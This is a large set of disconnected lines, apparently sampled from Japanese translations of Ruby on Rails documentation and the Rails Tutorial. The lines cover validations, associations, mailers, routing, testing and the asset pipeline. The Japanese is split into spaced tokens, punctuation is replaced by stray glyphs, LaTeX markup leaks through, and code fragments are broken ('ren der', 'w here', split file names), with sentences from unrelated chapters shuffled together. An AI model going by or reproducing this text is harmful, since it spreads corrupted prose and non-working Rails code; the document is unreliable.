Rails アプリケーション 自身 は これ ら の デコレータ を 参照 する こと は な い の で 、 Rails の 自動 読み込 み 機能 で は これ ら の デコレータ を 読み込 ん だり 起動 し たり でき ま せ ん 。
レイアウト と レンダリング
###  バリデーション の スキップ
   belongs_to  : order ,  -> { includes : customer  }
リスト \ ref{ code :sendgrid_config_redux } に 示 し た とおり 、 本番 Web サイト の アドレス を \ kode { host } 変数 に 定義 する 必要 も あ り ま す 。
*   クッキー 機能 を 提供 し ま す 。
この ` blorgh ` エンジン で あ れ ば 、 記事 と コメント の 作者 の 情報 が あ る 方 が ずっと わか り やす く な り ま す 。
assemblies▖ size
ユーザー ごと の マイクロ ポスト を RSS フィード する 機能 を 実装 し て くださ い 。
###  Action   Mailer
Action   View は 、 現在 の ロケール に 応じ て さまざま な テンプレート を 出力 する こと が でき ま す 。
パスワード 再 設定 用 の \ kode { create } アクション
リスト \ ref{ code : password _ reset_integration_test } の コード を 使用 する と 、 テスト コード は   \ passing   に な る はず で す 。
hello " )    # => true
grade_deployment   ( end ) ╼╼  \ section { 最後 に } %  ( fold) ╼  \ label{ sec : sign_up_conclusion}╼ ╼ Being  able  to   sign   up   users   is   a   major   milestone   for  our application ▖
       create     db /migrate/201303 0 7 00 5 5 2 8 _ create_microposts▖rb
` redirect_to ` を 呼び出 す と 、 一時 的 な リダイレクト を 意味 する HTTP ステータス コード 302 が ブラウザ に 返 さ れ 、 ブラウザ は それ に 基 い て リダイレクト を 行 い ま す 。
述語 ` in ? ` は 、 ある オブジェクト が 他 の オブジェクト に 含 ま れ て い る か どう か を テスト し ま す 。
この オプション は 、 ` sass - rails ` を 使用 する と デフォルト で 設定 さ れ ま す 。
C ▖ descendants # =>  [ B ,   A ,   D ]
```yaml
先ほど の 順 で 書 い た 統合 テスト は 、 リスト \ ref{ code :micropost _ interface _ test } の よう に な り ま す 。
C : : X " ,  false )  # => false
Relationships コントローラ の 認可 を テスト する 。
|   app/assets/javascripts/ comment ▖ js▖ coffee     |  コントローラ 用 の Coffee Script           |
データ モデル の 変更 が 必要 に な っ た ら その 都度 マイグレーション を 行 う の が Rails 流 で す 。
Ruby   on   Rails   に 貢献 する 方法
       content :  encoded_content
\ ref{ sec : signing _ in } で は 、 Rails の \ kode {session } メソッド を 使用 し て ユーザー ID を 保存 し ま し た が 、 この 情報 は ブラウザ を 閉じ る と 消え て しま い ま す 。
orders ▖exists ? ( ▖▖▖)
この ヘルパー は 、 オブジェクト が 保存 さ れ る 直前 に 、 属性 の 値 が 一意 で あ り 重複 し て い な い こと を 検証 し ま す 。
*   [ ファイル 名 の 変更 に クエリ 文字 列 を 使用 し て は いけ な い 理由 ] ( http://www ▖stevesouders▖ com/blog/2008 / 0 8 / 23 / revving - filenames- dont -use -querystring/ )
次 に 、 拡張 子 を   \ kode {▖ md }   に 変更 し 、 Markdown ファイル と し て 認識 でき る よう に し ま す ▟ その 後 、 これ ら の 変更 を コミット し ま す 。
やる気 の 余 っ て い る 方 は 実装 し て み て も よ い で しょ う 。
Your  bun dle   is   complete !
従 っ て 、 Home ページ の テスト は パス する はず で す 。
リスト \ ref{ code :rails_ command } の コマンド で は 、 Rails の バージョン を ( \ kode { _ 4 ▖ 2 ▖ 0 _ } ) と 明示 的 に 指定 し て い る 点 に ご 注目 くださ い 。
構造 を 追加 し た Web サイト の レイアウト
*   Rails アプリケーション で メール を 送受信 する 方法
もちろん あ り ま す ▟ それ も いろんな 方法 が あ り ま す 。
たとえば 、 Action   Mailer の 場合 は 以下 を 実行 し ま す 。
提供 さ れ た 接続 情報 が 重複 し て い る 場合 、 環境 変数 が 優先 さ れ ま す 。
resources   :user_permis sions ,   controller :  ' admin /user_permis sions '
I18n ▖ with _options   locale :  user▖ locale ,  scope :  " newsletter "   do  |i 18 n |
\ begin {equation}╼\ label{ eq:time_delta}╼ \ Delta t_r > \ Delta t_e▖
#   名前 付き スコープ を 経由
上 の コード は \ kode {div } タグ が あ る か どう か を チェック し ま す 。
    errors [ : base ]  <<  " この 人物 は 以下 の 理由 で 無効 で す ▖▖▖ "
#### option_groups_ from_collection_for_select
たとえば 以下 の 呼び出し を 行な う と 、 アプリケーション で 現在 どの ページ が 表示 さ れ て い て も 、 写真 の インデックス 表示 ページ に リダイレクト さ れ ま す 。
    cookies▖encrypted [ : expiration_date ]  # =>  " 2014 - 0 3 - 20 "
ユーザー の \ kode {index } アクション
通常 の Rails アプリケーション の 場合 、 外部 から の gem ファイル を ここ に 置 き ま す 。
Users リソース を 生成 し て 内容 を 理解 し ま し た の で 、 今度 は Microposts リソース で 同じ こと を や っ て み ま しょ う 。
バグ を 見つけ た ら 、 その バグ を 再現 する テスト を 真っ先 に 書 き 、 回帰 バグ を 防 ぐ 体制 を 整え て から アプリケーション の コード の 修正 に 取りかか る 。
//= require  slider
ついに 、 サンプル アプリケーション の 山頂 が 目 の 前 に 現れ ま し た ▟ 最後 の 難関 、 ステータス フィード の 実装 に 取りかか り ま しょ う 。
` development ` セクション の ユーザー 名 と パスワード は 適切 な もの に 置き換え て くださ い 。
時   ( hour )   が ゼロ の 場合 、 分 と 秒 も 値 を 与え られ な い 限り 同様 に ゼロ に な り ま す 。
これ は リスト \ ref{ code :initial_ signup_test } で 使用 さ れ て い ま し た 。
*   Capistrano の デプロイメント タスク で アセット の プリ コンパイル を 行 わ な い こと 。
本書 向け に 、 以下 を 実行 し て \ kode {railstutorial_rails _ 4 _ 0 } と い う 名前 の gemset を 作成 し て お く こと を お 勧め し ま す 。
Article ▖ w here ( 'id   >   10 ') ▖ limit ( 20 ) ▖ order ( 'id   desc') ▖ only(:order ,   : where )
#   Table   name :   users
上 の コード に よ っ て 生成 さ れ る HTML は 以下 の よう に な り ま す
サイン イン に 失敗 し た 時 の テスト が でき た の で 、 次 は サイン イン に 成功 し た 場合 の テスト を 作成 し ま しょ う 。
* `:type ` は MIME タイプ を 明示 的 に 指定 し た い 場合 に 使用 し ま す 。
" Backoffice : : Session " ▖ un derscore   # => " backoffice/session "
production 環境 で 何 ら か の データベース を 使用 する 場合 、 その ため の アダプタ は たいてい の 場合 探 せ ば 見つか り ま す 。
###  接続 設定
` : object ` オプション を 使用 する こと で 、 この ローカル 変数 に オブジェクト を 渡 す こと が でき ま す 。
require   'active_ support'
        ren der   layout :   "old "
最初 は \ kode {image } と い う 属性 名 を 使 っ て い た の で す が 、 この 名前 だ と 一般 的 すぎ て 、 逆 に 混乱 を 招 い て しま い ま し た 。
SendGrid を 使用 する と production 環境 から メール を 送信 でき る 。
   before_enqueue   do  | job|
### `:if ` や `:unless ` で Proc を 使用 する
続 い て 、 この リモート ブランチ を 使用 し て ローカル の コード ベース を 更新 し ま す 。
正し い メール アドレス を 送信 し た 場合 に も アプリケーション が 正常 に 動作 する ため に は 、 パスワード 再 設定 の メイラー メソッド を 定義 する 必要 が あ り ま す 。
X : : Y: : Z ▖ parents # => [ X : : Y ,   X ,  Object ]
#   has_ secure_ password
最後 の 課題 は マイクロ ポスト の 投稿 数 を 表示 する こと で す が 、 これ は \ kode { count } メソッド を 使 う こと で 解決 でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_relationships_method_test } に 示 し ま す 。
後 は いつ も の よう に マイグレーション を 実行 し ま す 。
{ 0 } 図 11 ▖ 7 { / 0 } { 1 } ユーザー の リレーションシップ で 表 さ れ る 、 フォロー し て い る / さ れ て い る ユーザー の モデル ▟ { / 1 }
カスタム CSS 用 の ファイル を 作成 し た ら 、 リスト { p 0 } の よう に { 2 } @import{ / 2 } を 使用 し て 、 Bootstrap   ( と それ に 関連 する Sprockets)   を インク ルード し ま す
####  Vanilla   Java Script を 出力 する
Rack に 関 する 基本 的 な 知識 が 足 ら な い 場合 、 下記 の [ リソース ] ( # 参考 資料 )   を 参照 し て くださ い 。
####  遠 い 将来 に 期限 切れ に な る ヘッダー
    論理 値 ?   ?
tomorrow
  #  attribs :   id ,   name
date▖ beginning _ of_day  # =>  Mon   Jun   0 7   0 0 : 0 0 : 0 0   + 0200   2010
つまり 、 ユーザー は プロファイル ページ を 最初 に 表示 し 、 それ から ユーザー を フォロー し 、 その 後 すぐ 元 の ページ に リダイレクト さ れ る と い う 流れ に な り ま す 。
情報 が 更新 さ れ た ユーザー
たとえば 、 アプリケーション が ` Blorgh : : Articles Controller ` の index アクション の 結果 を 出力 する ため の ビュー を 探索 する 際 に は 、 最初 に アプリケーション 自身 の ` app/views/blorgh/articles/index▖html ▖erb ` を 探索 し ま す 。
リスト \ ref{ code : password _ reset_edit_ action } で は 以下 の コード を 使用 し て い ま す 。
#   Expires *   ディレクティブ を 使用 する 場合 は Apache の
テスト 環境 で \ kode { full \_title } ヘルパー を 使 う  
次 に 、 \ kode { Test : :Unit } の 代わり に RSpec を 使 う よう に 、 Rails の 設定 を 変更 し ま す 。
# =>  ArgumentError :   invalid   date
以上 の 説明 を 実際 の User モデル に 適用 し て でき た 、 一般 化 さ れ た \ kode {authenticated ? } メソッド を リスト \ ref{ code : generalized_authenticated_p } に 示 し ま す 。
has _one  : through 関連 付け の 図 ] ( images/has _one_through ▖ png )
    has_many : tags
# =>  Tue ,   0 8   Jun  2010   0 1 : 56 : 22   + 0000
ここ で の 最初 の 作業 は 、 フォロー し て い る ユーザー の リンク と フォロワー の リンク を 動 く よう に する こと で す 。
TIP :   折り返し が 発生 し な い ぐらい に 十分 大きな サイズ の ターミナル を 使用 でき る の で あ れ ば 、 ` rake   routes ` コマンド の 出力 の 方 が おそらく 読 み やす い で しょ う 。
  # initialization  code  goes   here
     constraints :  Blacklist Constraint ▖ new
### ` with _options `
デフォルト は ` ActionDispatch : : Public Exceptions ▖ new ( Rails ▖ public _ path ) ` で す 。
  @msg  =  " No   account   found   for   this   supplier "
きわめて シンプル な バリデーション の 例 を 以下 に 紹介 し ま す 。
user  =  User ▖ new  do  | u |
╼files  ( the  " Software " ) ,   to   deal   in  the   Software   without   restriction ,
シンボル \ kode { :user } が \ kode {factory } コマンド に 渡 さ れ る と 、 Factory   Girl は それ に 続 く 定義 が User モデル オブジェクト を 対象 と し て い る こと を 認識 し ま す 。
Home 、 Help 、 About ページ に は 可変 要素 が あ る の で 、 Rails の \ kode { provide } 関数 を 使用 し て タイトル を ページ ごと に 変更 し ま す 。
たとえば 、 注文 ( order ) が 顧客 ( customer ) に 従属 し て い る が 、 実際 の 顧客 モデル 名 が ` Patron ` で あ る 場合 に は 以下 の よう に 指定 し ま す 。
  else
ユーザー 登録 に 失敗 し た 場合 は new ビュー を 再 描画 する よう に し た ▟ その 際 、 Active   Record が 自動 的 に 検知 し た エラー メッセージ を 表示 でき る よう に し た
-----------------
a 1 ▖ x  # = >   1   ( A が 使 わ れ る )
「 \ href { http://devcenter ▖ heroku▖ com/articles/local - postgresql} { Heroku  instructions   for   local   Postgre SQL   installation } 」 に は 、 Postgre SQL を ローカル 環境 に インストール する 手順 が 紹介 さ れ て ま す 。
たとえば 、 1人 の 顧客 ( customer ) が 複数 の 注文 ( order ) を 持 っ て い る が 、 実際 の 注文 モデル 名 が ` Transaction ` で あ る 場合 に は 以下 の よう に 指定 し ま す 。
╼ including   without   limitation  the  rights  to  use ,   copy ,   modify ,   merge ,
アカウント 有効 化 の プレビュー メソッド   ( 動作 可能 )
Rails  console の デフォルト の 環境 は \ texttt { development } で す 。
[ Rails   development  box ] (https://github▖ com/rails/rails - dev- box ) に あ る できあい の development 環境 を 入手 する の が お すすめ で す 。
第 \ ref { cha :static _ pages } 章 で は 静的 な ページ を 作成 し 、 そこ に 動的 な 要素 を 順次 追加 し て い き ま す 。
` config/ environments/production ▖rb ` で は 明示 的 に true に 設定 さ れ て い ま す 。
次 の よう な 点 に 注意 し ながら 進め ま しょ う 。
次 に 、 この メソッド 自身 は User モデル の 内部 で しか 使用 し な い の で 、 外部 の ユーザー が アクセス でき る よう に する 必要 は あ り ま せ ん 。
    <p > Customer: <%=   customer▖ name  %></p>
` content_ for ` メソッド を 使用 する こと で 、 コンテンツ を 名前 付き の ` yield ` ブロック と し て レイアウト に 挿入 でき ま す 。
` validates_with ` は 、 バリデーション に 使用 する 1 つ の クラス 、 また は クラス の リスト を 引数 に 取 り ま す 。
外部 キー の 詳細 は \ ref{ sec : relationship_user_associations } で 学 び ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ class/subclasses▖rb ` で す 。
既に 最初 の タブ で サーバー を 開始 し て い る 場合 は 、 Ctrl + C を 押 す と サーバー を 終了 でき ま す 。
変更 後 の データ モデル は 図 \ ref { fig :user_ model_account_activation } の よう に な り ま す 。
      t▖ string   : name
Client▖select ( " viewable_by ,   locked " )
ひとまず この エラー は 無視 し ま しょ う 。
データ が 有効 な 場合 の テスト も 大きな 違い は あ り ま せ ん が 、 今度 は カウント が 更新 さ れ な い の で は な く 、 カウント が 1 つ 増え る こと を 確認 し ま す 。
メイラー の テスト
どの くらい 細か く テスト する か は お 任せ し ま す ▟ リスト \ ref{ code :error _messages_test } に テンプレート を 用意 し て お い た の で 、 参考 に し て くださ い 。
ユーザー を 検索 する 一般 的 な 方法 を あと 少し だけ ご 紹介 し て 、 この 節 を 終わり に する こと に し ま しょ う 。
で は 、 オブジェクト が 本当 に 削除 さ れ た か どう か を どの よう に し て 知 れ ば よ い の で しょ う か 。
まとも な テスト が な い
create      app/views/blorgh/articles
( \ kode {user_ id } と \ kode { created_at } に インデックス が 与え られ て い る こと に 注意 )
    X 1   =   1
これ は あくまで 説明 の ため の もの で す ) 。
#   app/controllers/users_controller▖ rb
前回 の アクセス 制御 と 同様 に 、 まず は テスト から 書 い て い き ま す ▟ 今回 使 う テスト は リスト \ ref{ code : following _ followers_authorization_test } の とおり で す 。
use  #< ActiveSupport: : Cache: : Strategy : : Local Cache: : Middleware : 0 x 00000001 c 304 c 8 >
パスワード 再 設定 時 の エラー 表示 を 更新 する
< div>
= >   42
ログ イン 失敗 時 の 正し い 処理  
最初 に 、 生成 さ れ た テンプレート を カスタマイズ し て 、 実際 に 有効 化 メール で 使え る よう に し ま す   ( リスト \ ref{ code :application_mailer } ) 。
パーシャル に オブジェクト を 渡 す ため に 、 値 が オブジェクト で 、 キー が パーシャル で の 変数 名 と 同じ ハッシュ を 利用 し ま す ▟ これ で 、 以下 の コード が 完成 し ま す 。
レイアウト 内 の いく つ か の リンク を 埋め る こと が でき た の で 、 これ ら の リンク が 正し く 動 い て い る か どう か チェック する テスト を 書 い て み ま しょ う 。
この よう な コード が あ る と 、 悪意 の あ る 人物 が データベース を 意 の まま に する こと が でき 、 データベース 全体 が 危険 に さら さ れ ま す 。
バリデーション の 実行 直前 に 呼び出 さ れ る メソッド 名 を シンボル で `: if ` や `:unless ` オプション に 指定 する こと も でき ま す 。
共通 の バリデーション オプション を 以下 に 示 し ま す 。
12355 5 1234 ▖ to_s(:phone ,   area_code :  true )
一般 に 、 ある メソッド が オブジェクト の インスタンス を 必要 と し て い な い 場合 は 、 クラス メソッド に する の が 常道 で す 。
この 時点 で 、 User モデル の spec は パス する はず で す 。
` only ` メソッド を 使用 する と 、 条件 を 上書き でき ま す 。
  #  デフォルト   ( 作成 時 と 更新 時 の どちら の 場合 に も バリデーション を 行な う )
サイン イン が 失敗 し た とき の 正し い コード 。
*   デプロイ 先 が 複数 あ り 、 同じ 作業 を 繰り返 し た く な い 。
<%=   form _ for   [@ article ,  @ article ▖ comments▖build ]   do  | f| %>
###  Time
## #   静的 な セグメント
[ Cache - Control ヘッダ ] ( http://www ▖w 3 ▖org / Protocols/rfc 2616 / rfc 2616 - sec 14 ▖html# sec 14 ▖ 9 ) は 、 リクエスト が キャッシュ さ れ る 方法 を 定め た W 3 C の 仕様 で す 。
*  ` from `
上 の コード は 、 統合 テスト の 実行 中 に は \ kode {true } を 返 し 、 その 他 の 場合 に は false を 返 し ま す 。
これ で 、 テスト が   \ passing   に な る はず で す 。
完全 な メッセージ は 以下 の よう な 感じ に な り ま す 。
ここ で は 、 1人 の ユーザー に 対 し 複数 の マイクロ ポスト が あ る と し ま しょ う 。
実 は 、 この 2 つ は 完全 に 同等 で す ▟ \ kode {attr_accessor } は 、 単に ゲッター メソッド や セッター メソッド を 自動 的 に 作成 する 便利 な 方法 で しか あ り ま せ ん 。
    ren der   'edit'
\ kode { full_title } メソッド を 持 つ RSpec ユーティリティー 用 ファイル 。
Git リモート は 他 の 場面 で も 何 か と 便利 な もの で す が 、 まだ 作成 し て い な い 場合 は 以下 を 最初 に 行 っ て くださ い 。
もし 上 の 例 が 少し 不 自然 に 思え る なら ば 、 勘 が 鋭 い と いえ ま す ▟ と い う の も 、 これ は わざと 不 自然 に 書 い た から で す 。
#  visible_ articles   メソッド は リレーション を 1 つ 返 す こと が 期待 さ れ て い る
本番 環境 で の 画像 アップロード
    puts  client ▖ address▖ postcode
“ Engine   X "   と 発音 し ま す 。
この 方法 は 、 文字 列 が 十分 短 い 場合 に のみ 使用 する の が よ い で しょ う 。
将来 、 ユーザー 定義 の タイム ゾーン が システム の タイム ゾーン と 比較 さ れ る こと が あ り え ま す ▟ システム の タイム ゾーン で は デフォルト で ` Time#now ` が 使用 さ れ ま す 。
$  rails  c
= >  String
関連 付け られ た レコード の 存在 が 必須 で あ る 場合 、 これ を 検証 する に は ` : inverse _of ` オプション で その 関連 付け を 指定 する 必要 が あ り ま す 。
NoMethodError :   You   have   a  nil  object   when  you  didn't   expect  it !
通常 は この 3 つ の 環境 で 事足 り ま す が 、 場合 に よ っ て は 環境 を 追加 し た く な る こと も あ る と 思 い ま す 。
リスト { p 0 } の { 2 } hello{ / 2 } アクション を 書き換え 、 「 Hello ,   world ! 」 の 代わり に 「 hola ,  mundo ! 」 と 表示 さ れ る よう に し て み ま しょ う 。
` : allow_ nil ` オプション を 使用 する と 、 例外 の 代り に ` nil ` を 返 す よう に する こと が でき ま す 。
あるいは 、 自分 の アイディア に 興味 を 示 し て くれ る 人 が 返信 し て くれ る か も しれ ま せ ん 。
最後 に 以下 を 実行 し て Ruby   2 ▖ 0 ▖ 0 を インストール し ま す ▟ ここ で は Open SSL の 場所 を RVM に 知 ら せ る オプション を 追加 し て あ り ま す 。
` config/application ▖rb ` に 記述 する こと で 、 標準 の ` assets/*` に 加え て 追加 の   ( fully qualified )   パス を パイプライン に 追加 する こと が でき ま す 。
╼  => true
   def  self ▖ broadcast_notifications ( users ,  ▖▖▖)
" AdminUser " ▖ un derscore   # =>  " admin _user "
` app/assets ` に 置 か れ た ファイル が その まま の 形 で production 環境 で 使用 さ れ る こと は 決して あ り ま せ ん 。
本 チュートリアル で この 詳細 が 重要 に な る こと は あ り ま せ ん ▟ また 、 この 外部 キー に よ る 制約 は 、 すべて の データベース で 使え る わけ で は あ り ま せ ん
       format ▖ json { ren der   json : @user   }
|                     |  50 6                | : variant_also_negotiates         |
送信 先 の 指定 は ` form _ for ` の `:url` オプション で 簡単 に 指定 でき ま す 。
これ は リスト \ ref{ code : name_title_and _heading } で 使用 さ れ て い ま し た 。
      <div  id = " right _menu" > Right  menu items   here < / div>
最初 に 無料 の サービス を 利用 し て メール を 送信 し 、 続 い て アプリケーション の 設定 と デプロイ を 行 い ま す 。
これ を チェック する に は 否定 演算 子   ( \ ref{ sec : objects_and _message_ passing } ) が 必要 な の で 、 \ kode { ! }  ( 参考 :   英語 で は bang と 読 み ま す )   を 使用 し ま す 。
`ordinalize ` メソッド は 、 レシーバ の 整数 に 、 対応 する 序数 文字 列 を 追加 し た もの を かえ し ま す 。
module  Blorgh : : Concerns : : Models : : Article
      * `find_all_ by _▖▖▖`            に 代え て   ` w here ( ▖▖▖)
( テーブル CSS の ルール が ネスティング   ( 入れ子 )   さ れ て い ま す が 、 これ が 有効 に な る の は Asset   Pipeline で Sass エンジン が 使用 さ れ て い る 場合 に 限 ら れ ま す )   。
*   Active   Record モデル を 使用 し て リレーショナル データベース に 保存 さ れ た データ を 操作 する
*   Rails   4 で は Ruby   2 ▖ 0 が 推奨 さ れ ま す ▟ Ruby   1 ▖ 9 ▖ 3 以上 が 必須 で す 。
Client ▖ w here ( " created_at >= : start_date  AND   created_at <= : end_ date " ,
フォーク を アップデート し ま す 。
\ begin {equation}╼\ label{ eq : delta_e}╼ \ Delta t_e = t_N - t_e▖
<%=   audio _tag   " m u sic/first _song▖ mp 3 "   %>
% w ( Earth   Wind   Fire ) ▖ to_sentence   # => " Earth ,   Wind ,   and   Fire "
###  イン ライン コール バック ブロック で ` return ` の 使用 法
マニフェスト ファイル は 必要 に 応 じ て いく つ で も 使用 でき ま す 。
コントローラ の 機能 は 、 通常 で あ れ ば たとえば 以下 の よう に ` GET ` を コントローラ に 送信 する こと で テスト する で しょ う 。
Sublime  Text を 使用 し て い れ ば 、 エディタ の 中 から 直接 テスト を 実行 でき る 強力 な ヘルパー コマンド を 利用 でき ま す 。
ユーザー / リレーションシップ の \ kode { has_many } の 関連 付け を 実装 する 。
account▖ to_query ( ' company [ name ] ')
    layout   ' awesome' #  awesome▖ ( html| text ) ▖erb を レイアウト と し て 使用 する
サンプル データ 生成 タスク に 管理 者 を 1人 追加 する
アプリケーション 環境 が 表示 さ れ て い る デフォルト ページ 。
##### ` collection ▖ w here ( ▖▖▖)
デフォルト は ` :utc ` で す 。
*   MVC   ( モデル ・ ビュー ・ コントローラ )   および RESTful デザイン の 基礎
d   =  Date▖ new (2010 ,   5 ,   8 )       # =>  Sat ,   0 8   May  2010
###  使用 法
####  デコレータ と コード の 読み込み に 関 する メモ
リスト \ ref{ code : signup_with _account_activation_test } の テスト が でき た の で 、 ユーザー 操作 の 一部 を コントローラ から モデル に 移動 する と い う ささやか な リファクタリング を 行 う 準備 が でき ま し た 。
それ で は 、 リスト \ ref{ code : layout_new_structure } の 新し い 要素 を 上 から 順 に 見 て い き ま しょ う 。
URL に 対 する テスト が できあが っ た の で 、 それ ら を 実際 に 利用 でき る よう に し ま しょ う 。
*   上記 以外 の 場合 で 、 引数 が ` to_ary ` に 応答 する 場合 は ` to_ary ` が 呼び出 さ れ 、 ` to_ary ` の 値 が ` nil ` で な い 場合 は その 値 が 返 さ れ ま す 。
変更 を マージ し た 後 は 、 \ kode { git  branch   - d } を 実行 し て トピック ブランチ を 削除 すれ ば 終わり で す 。
REST は 、 インターネット その もの や Web アプリケーション など の 、 分散 ・ ネットワーク 化 さ れ た システム や アプリケーション を 構築 する ため の アーキテクチャ の スタイル の 1 つ で す 。
今 の 段階 で テスト を 書 か せ よう と する と 、 尻込み し て しま う 人 も い る か も しれ ま せ ん 。
バリデーション の 詳細 を 説明 する 前 に 、 アプリケーション 全体 に お い て バリデーション が いかに 重要 で あ る か に つ い て 説明 し ま す 。
<% =  ren der @products %>
class   Proc
レイアウト を 決定 する 際 に 、 Proc など の イン ライン メソッド を 使用 する こと も でき ま す 。
上 の コード は 、 最初 の 30 クライアント を スキップ し て 31 人 目 から 最大 5 人 の クライアント を 返 し ま す 。
リスト \ ref{ code : backtrace _ silencer } の コメント 冒頭 に あ る よう に 、 backtrace   silencer を 追加 し た 後 は 必ず Rails   web サーバー を 再 起動 し て くださ い 。
実際 に は 、 この 関連 付け で は 以下 の よう に \emph { クラス } 名 を 明示 的 に 含め る 必要 が あ る こと に 注意 し て くださ い 。
</table>
これ だけ で も かなり の 量 で す が 、   Web 開発 つ い て 学 ぶ べ き こと は まだまだ たくさん あ り ま す 。
# =>  [' admin ' ,  'member' ,  ' guest ' ]
サンプル コード
モデル の テーブル に 含 ま れ る レコード の 個数 を 数え る に は ` Client▖ count ` を 使用 でき ま す ▟ 返 さ れ る の は レコード の 個数 で す 。
( 例えば 、 行末 に セミコロン を 書 く 習慣 が つ い て い る か も しれ ま せ ん が 、 Ruby   で は 行末 に セミコロン を 置 い て も 問題 な く 動 き ま す ▟ )
これ は リスト \ ref{ code : palindrome_if } で 使用 さ れ て い ま し た 。
` camelize ` メソッド は 、 レシーバ を キャメル ケース   ( 冒頭 を 大 文字 に し た 単語 を スペース なし で 連結 し た 語 )   に し た もの を 返 し ま す 。
Rails   4 は ` app/assets/javascripts/application ▖js` と ` app/assets/stylesheets/application ▖css ` ファイル を 両方 作成 し ま す ▟ これ は Rails アプリケーション 新規 作成 時 に - - skip- sprockets を 指定 する か どう か に かかわ ら ず 行 わ れ ま す 。
バリデーション ヘルパー に は 、 それぞれ デフォルト の エラー メッセージ が 用意 さ れ て い ま す 。
上 の params ハッシュ に は 、 Person モデル 用 の 値 が ネスト し た 形 で 含 ま れ て い る の で 、 コントローラ で ` params [ : person ] ` と 書 く こと で 内容 に アクセス でき ま す 。
既に 例示 し た よう に 、 ` : message ` オプション を 使用 する こと で 、 バリデーション 失敗 時 に ` errors ` コレクション に 追加 さ れ る カスタム エラー メッセージ を 指定 でき ま す 。
多く の アダプタ で は 複数 の キュー を 扱 う こと が でき ま す 。
`blorgh_ articles ` テーブル の レコード と 、 ` users ` テーブル の レコード を 関連 付け る ため の 方法 が 必要 で す 。
Using   the   generalized  \kode {authenticated ? } 
図 \ ref { fig :user_ show _ rails _ 3 } の デバッグ 情報 で \ kode { params [ : id ] } の 値 を 確認 でき る こと に も 注目 し て くださ い 。
      invoke    helper
" application - 723 d 1 be 6 cc 741 a 3 aabb1cec 242 76 d 681 ▖ js" , " application ▖css " :
今後 、 コンソール コマンド の 出力 は 、 特に 教育 的 効果 が 高 い と 思え る 場合   ( ここ で の \ kode {User ▖ new } の 場合 など )   を 除 い て 省略 いた し ま す 。
       create         test/helpers/users _helper_test ▖ rb
" people " ▖ classify        # =>  " Person "
<%=   link_to   ' よ う こそ ' ,  welcome_url  %>
##### `: location ` オプション
\ kode { spec/support } ディレクトリ は RSpec に よ っ て 自動 的 に 読み込 ま れ る ため 、 Home テスト は 以下 の よう に 書 く こと が でき ま す 。
   <option   value =" " > Please select < /option >
    resources   : examples
index ビュー に 対 する 最初 の リファクタリング
Users リソース を routes ファイル に 追加 する
なお 、 送信 に 失敗 し た とき に \ kode {new } アクション が 再 描画 さ れ る はず な の で 、 \ kode {assert_template } を 使 っ た テスト も 含め て い る こと に 注意 し て くださ い 。
( 興味 の あ る 方 は 、 RailsCast の 「 \ href { http://railscasts▖ com/episodes/267 - coffeescript- basics} { Coffee Script の 基礎 }   ( 英語 ) 」 から 始め る と 良 い で しょ う ) 。
  @ article ▖ destroy
  \ kode { name } 属性 に 長 さ の 検証 を 追加 する
scope  ' admin '  do
以下 の よう に 、 数値 を 通貨 形式 の 文字 列 に 変換 でき ま す 。
authenticated ?(:activation ,   token )
言 う まで も な い こと で す が 、 既存 の アプリケーション を アップグレード する 際 に は 、 何 の ため に アップグレード する の か を はっきり さ せ て お く 必要 が あ り ま す 。
\ kode { git   push } コマンド で 変更 を リモート リポジトリ に プッシュ する 方法 に つ い て は \ ref{ sec : git_ command s } で 解説 し ま す 。
この よう な 場合 は 、 `unscoped ` の ブロック 形式 を 使用 する こと が 推奨 さ れ ま す 。
#     <url- id > jeremy - kemper< /url- id >
Rails で の 無用 な トラブル を 避け る ため の 最も 初歩 的 な 方法 は 、 外部 データ を 常 に UTF - 8 で 保存 する こと で す 。
   stringish▖ to_s▖html_safe
` collection ▖ create ` メソッド は 、 関連 付け が 行 わ れ た オブジェクト を 1 つ 返 し ま す 。
orphan =  Object▖send(:remove_ const ,  : M )
    @user  =  User ▖ new
今後 の スタイル 要素 を 利用 する ため に 、
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array/ extract _options ▖rb ` で す 。
#   SELECT   person _id   FROM   people
       create      app/views/users/show ▖html ▖erb
この マイ グレーション を 実行 する コマンド は 以下 の とおり で す 。
( リスト \ ref{ code :microposts_ interface _ test } で は \ kode { post }   followed   by   \ kode { follow_ redirect ! }
*  `config▖ mid dleware ▖ insert_before ( existing _ mid dleware ,   new_ mid dleware ,  args) ` -   ( 第 一 引数 で ) 指定 さ れ た ミドルウェア の 前 に 新し い ミドルウェア を 追加 し ま す 。
これ ら の メソッド に 渡 す 引数 は 、 レシーバ から の 相対 的 な 修飾 済み 定数 名 で あ る こと が 前提 と な り ま す 。
これ ら の API に 依存 し て しま う と 、 Rails を 次 の リリース に アップグレード し た とき に アプリケーション や Gem が 壊れ る 危険 性 が あ り ま す 。
` : validate ` オプション を ` false ` に 設定 する と 、 関連 付け られ た オブジェクト は 保存 時 に 検証 ( validation ) さ れ ま せ ん 。
これ は 完全 に 有効 な 方法 で す 。
\ href { http://www▖thinkful▖ com/a/railstutorial } { Thinkful} :   プロ の エンジニア と ペア を 組 ん で 、 プロジェクト 実践 型 の カリキュラム で 進 ん で い く オン ライン 講座 で す 。
       is  a   project  to   make  a   book   and   screencasts  to teach   web   development
module   A
|   PRI MARY  |   4         |  const  |      1   |       |
class   Supplier <  ActiveRecord : : Base
`url_ for _options ` で 設定 さ れ た URL へ の アクション に 送信 さ れ る フォーム タグ を 作成 し ま す ▟ これ は ` Action Controller : : Base #url_ for ` と 似 て い ま す 。
###  config/ environments/production ▖ rb
ubsection   current_user   ( end ) ╼╼    \ subsection { レイアウト リンク を 変更 する } %  ( fold) ╼    \ label{ sec : changing_ the_layout_links}╼╼
タイトル に ERB コード を 使用 し た About ページ の ビュー   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
デフォルト で は 、 `stylesheet_link_tag ` に よ っ て 作成 さ れ る リンク に は ` media = " screen "   rel = " stylesheet " ` と い う 属性 が 含 ま れ ま す 。
続 い て bcrypt を 使用 し 、 \ kode {cookies [ : remember\_token ] } が \ kode {remember\_digest } と 一致 する こと を 確認 し ま す   ( リスト \ ref{ code :user_ model_remember} ) 。
トピック ブランチ の 削除 は 必須 で は あ り ま せ ん ▟ 実際 、 トピック ブランチ を 削除 せ ず に その まま に し て お く こと は よく 行 わ れ て い ま す 。
